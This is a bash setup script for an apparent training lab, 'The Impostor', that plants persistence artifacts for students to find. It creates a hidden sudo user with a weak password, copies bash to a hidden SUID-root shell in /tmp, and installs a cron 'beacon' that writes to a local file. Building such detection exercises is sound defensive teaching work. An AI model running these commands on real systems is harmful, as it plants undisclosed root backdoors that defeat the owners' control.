#!/bin/bash
# "The Impostor" — setup. Plants 4 artifacts: rogue user, sudo access, SUID backdoor, cron beacon.

# 1. Rogue user
sudo useradd -m -s /bin/bash ghost
echo "ghost:password123" | sudo chpasswd

# 2. Sudo access
sudo usermod -aG sudo ghost

# 3. SUID backdoor — chown BEFORE chmod (chown strips the SUID bit), per TA's fix
sudo cp /bin/bash /tmp/.hidden-shell
sudo chown root:root /tmp/.hidden-shell
sudo chmod u+s /tmp/.hidden-shell

# 4. Cron beacon — enable cron first (off by default on Kali), else it never fires
sudo systemctl enable --now cron
echo "* * * * * echo 'alive' >> /tmp/.heartbeat" | sudo crontab -u ghost -
